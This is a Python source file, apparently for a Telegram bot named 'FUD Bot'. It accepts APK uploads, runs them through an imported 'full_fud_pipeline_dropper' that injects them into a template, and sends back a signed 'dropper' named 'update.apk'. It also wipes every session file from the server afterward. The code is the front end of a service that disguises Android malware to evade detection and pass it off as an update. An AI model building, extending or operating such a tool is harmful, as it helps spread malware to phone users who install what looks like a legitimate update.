import os
import asyncio
import uuid
import shutil
import threading
import traceback
import time
from flask import Flask
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.error import Conflict

from config import BOT_TOKEN, WORK_DIR, TEMPLATE_APK, VARIANTS_DIR
from pipeline import full_fud_pipeline_dropper, ensure_tools
from setup import _setup_done, _setup_error


flask_app = Flask(__name__)


@flask_app.route("/")
def home():
    return "OK", 200


def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)


def _read_step(session_dir):
    try:
        p = os.path.join(session_dir, "step.txt")
        if os.path.exists(p):
            with open(p) as f:
                return f.read().strip()
    except Exception:
        pass
    return "starting"


async def _heartbeat(status, stop_event, prefix, session_dir):
    start = time.time()
    while not stop_event.is_set():
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=15)
            return
        except asyncio.TimeoutError:
            pass
        elapsed = int(time.time() - start)
        step = _read_step(session_dir)
        try:
            await status.edit_text(f"{prefix}\n{step}\n⏳ {elapsed}s")
        except Exception:
            pass


async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tpl_ok = os.path.exists(TEMPLATE_APK)
    variants = 0
    if os.path.isdir(VARIANTS_DIR):
        variants = len([f for f in os.listdir(VARIANTS_DIR) if f.endswith(".apk")])
    status = "READY" if (tpl_ok or variants > 0) else "MISSING"
    await update.message.reply_text(
        f"🤖 FUD Bot\n\n"
        f"Template: {status}\n"
        f"Variants cached: {variants}\n\n"
        f"APK bhejo, signed dropper milega."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc = msg.document if msg else None
    if not doc or not doc.file_name.endswith(".apk"):
        await msg.reply_text("Sirf .apk bhejo.")
        return

    # Template check — either variant cache or single template
    has_variants = os.path.isdir(VARIANTS_DIR) and any(
        f.endswith(".apk") for f in os.listdir(VARIANTS_DIR)
    )
    if not has_variants and not os.path.exists(TEMPLATE_APK):
        await msg.reply_text(
            "❌ template.apk server pe nahi mila.\n"
            "GitHub repo root me daal ke redeploy karo."
        )
        return

    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    input_path = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "out.apk")

    status = await msg.reply_text("⚙️ Download...")
    stop_hb = asyncio.Event()
    hb_task = None

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(input_path)
        size_mb = os.path.getsize(input_path) / (1024 * 1024)

        # tools ensure (fast if already ready)
        await status.edit_text(f"🔧 Tools... ({size_mb:.1f} MB)")
        hb_task = asyncio.create_task(
            _heartbeat(status, stop_hb, "🔧 Tools...", session_dir)
        )
        await asyncio.to_thread(ensure_tools)
        stop_hb.set()
        try:
            await hb_task
        except Exception:
            pass
        hb_task = None

        # main pipeline
        stop_hb = asyncio.Event()
        hb_task = asyncio.create_task(
            _heartbeat(status, stop_hb, "🧬 Injecting...", session_dir)
        )

        # pick template — variant or fallback
        await asyncio.to_thread(
            full_fud_pipeline_dropper,
            "",  # empty → pipeline picks random variant or fallback
            input_path, output_path, session_dir,
        )

        stop_hb.set()
        try:
            await hb_task
        except Exception:
            pass
        hb_task = None

        # upload
        await status.edit_text("📤 Uploading...")
        with open(output_path, "rb") as f:
            await msg.reply_document(document=f, filename="update.apk")
        await status.edit_text("✅ Ready!")

    except Exception as e:
        tb = traceback.format_exc()
        print(tb, flush=True)
        try:
            await status.edit_text(f"❌ {str(e)[:400]}")
        except Exception:
            try:
                await msg.reply_text(f"❌ {str(e)[:400]}")
            except Exception:
                pass

    finally:
        stop_hb.set()
        if hb_task is not None:
            try:
                await hb_task
            except Exception:
                pass
        # Full cleanup — server pe kuch na bache
        shutil.rmtree(session_dir, ignore_errors=True)
        try:
            if os.path.exists(input_path):
                os.remove(input_path)
        except Exception:
            pass
        try:
            if os.path.exists(output_path):
                os.remove(output_path)
        except Exception:
            pass


async def run_bot():
    print("[*] waiting tools ...", flush=True)
    while not _setup_done.is_set():
        await asyncio.sleep(2)
    if _setup_error["exc"]:
        print(f"[!] setup error: {_setup_error['exc']}", flush=True)

    if os.path.exists(TEMPLATE_APK):
        print(f"[✓] template: {os.path.getsize(TEMPLATE_APK)} bytes", flush=True)
    else:
        print(f"[!] template.apk missing", flush=True)

    await asyncio.sleep(3)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", handle_start))
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("apk"),
        handle_apk,
    ))

    try:
        await app.bot.delete_webhook(drop_pending_updates=False)
    except Exception as e:
        print(f"[!] webhook: {e}", flush=True)

    await app.initialize()
    await app.start()

    while True:
        try:
            await app.updater.start_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=False,
            )
            print("🤖 polling active.", flush=True)
            break
        except Conflict as e:
            print(f"[!] conflict, retry 10s", flush=True)
            await asyncio.sleep(10)
        except Exception as e:
            print(f"[!] poll err: {e}, retry 5s", flush=True)
            await asyncio.sleep(5)

    await asyncio.Event().wait()


def main():
    os.makedirs(WORK_DIR, exist_ok=True)

    def _boot_setup():
        try:
            ensure_tools()
            print("[✓] boot setup done", flush=True)
        except Exception:
            traceback.print_exc()

    threading.Thread(target=_boot_setup, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    print("[✓] Flask started.", flush=True)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        pass
    finally:
        loop.close()


if __name__ == "__main__":
    main()
